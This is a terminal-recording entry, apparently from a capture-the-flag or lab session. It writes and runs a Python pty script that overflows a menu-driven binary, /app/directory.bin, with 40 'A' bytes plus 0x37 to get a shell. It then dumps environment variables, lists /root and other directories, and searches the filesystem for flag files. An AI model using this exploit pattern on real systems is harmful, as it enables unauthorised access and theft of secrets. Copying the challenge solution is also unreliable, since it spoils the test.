[2829.870734, "i", "cat << 'EOF' > /tmp/pty_exp.py\nimport pty, os, time, fcntl\n\npid, fd = pty.fork()\nif pid == 0:\n    os.execv('/app/directory.bin', ['/app/directory.bin'])\nelse:\n    fl = fcntl.fcntl(fd, fcntl.F_GETFL)\n    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)\n    \n    def send(msg):\n        os.write(fd, msg)\n        time.sleep(0.1)\n\n    time.sleep(0.2)\n    for _ in range(9):\n        send(b\"1\\n\")\n        send(b\"A\\n\")\n\n    send(b\"1\\n\")\n    send(b\"A\"*40 + b\"\\x37\\n\")\n    send(b\"4\\n\")\n    \n    time.sleep(0.5)\n    send(b\"echo EXPLOIT_SUCCESS; set; ls -la /tmp /root /app; find / -name '*flag*' 2>/dev/null\\n\")\n    time.sleep(1)\n    \n    out = b''\n    while True:\n        try:\n            chunk = os.read(fd, 4096)\n            if not chunk: break\n            out += chunk\n        except Exception:\n            break\n    print(out.decode('latin1'))\nEOF\npython3 /tmp/pty_exp.py\n"]
